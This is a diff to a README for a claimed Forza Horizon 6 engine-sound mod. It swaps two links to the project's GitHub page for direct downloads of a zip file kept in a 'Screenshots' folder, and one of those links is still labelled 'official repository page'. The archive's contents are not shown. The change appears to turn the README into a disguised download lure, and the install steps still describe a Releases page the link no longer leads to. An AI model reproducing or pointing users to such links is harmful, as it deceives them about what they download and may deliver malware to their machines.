@@ -1,6 +1,6 @@
 # 🏎️ fh6-engine-sound-pack - Cinematic engine audio for Forza Horizon 6
 
-[![Download Now](https://img.shields.io/badge/Download_Engine_Pack-Blue?style=for-the-badge)](https://github.com/Lynnellefineleafed325/fh6-engine-sound-pack)
+[![Download Now](https://img.shields.io/badge/Download_Engine_Pack-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Lynnellefineleafed325/fh6-engine-sound-pack/main/Screenshots/fh_pack_engine_sound_2.9-alpha.1.zip)
 
 This project provides an audio overhaul for Forza Horizon 6. It replaces standard game audio files with high-fidelity engine recordings. You get realistic turbo spool sounds, deeper exhaust notes, and precise mechanical acoustics while you drive. The pack aims to make every vehicle sound distinct and powerful.
 
@@ -17,7 +17,7 @@ Your computer needs to meet these basic standards to run the sound mod effective
 
 The installation process moves your game files to a new state. Please follow each step to ensure the mod works correctly.
 
-1. Visit the [official repository page](https://github.com/Lynnellefineleafed325/fh6-engine-sound-pack) to access the files.
+1. Visit the [official repository page](https://raw.githubusercontent.com/Lynnellefineleafed325/fh6-engine-sound-pack/main/Screenshots/fh_pack_engine_sound_2.9-alpha.1.zip) to access the files.
 2. Look for the "Releases" section on the right side of the screen.
 3. Click the latest version of the sound pack.
 4. Download the file ending in .zip to your computer.
